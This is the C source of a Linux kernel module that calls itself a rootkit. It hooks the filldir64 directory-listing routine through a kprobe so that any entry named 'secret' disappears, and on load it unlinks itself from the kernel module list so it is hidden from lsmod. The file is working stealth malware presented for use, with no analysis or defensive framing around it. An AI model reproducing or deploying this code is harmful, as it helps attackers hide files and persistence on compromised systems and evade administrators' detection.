#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/kprobes.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Wayko, Marx");
MODULE_DESCRIPTION("Hook filldir syscall to hide a directory and hide module from lsmod");
MODULE_VERSION("0.01");

void show(void);
void hide(void);
static struct kprobe kp;
static struct list_head *prev_module;
static short hidden = 0;

static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    char *dir = (char *)regs->si;
    int ret;

    if ((ret = strcmp(dir, "secret")) == 0) {
        regs->dx = 0;
    }
    return 0;
}

void show(void)
{
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void hide(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

static int __init rootkit_init(void)
{
    int ret;

    kp.symbol_name = "filldir64";
    kp.pre_handler = handler_pre;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        return ret;
    }
    
    hide();
    return 0;
}

static void __exit rootkit_exit(void)
{
    unregister_kprobe(&kp); 
    if (hidden) {
        show(); 
    }
}

module_init(rootkit_init);
module_exit(rootkit_exit);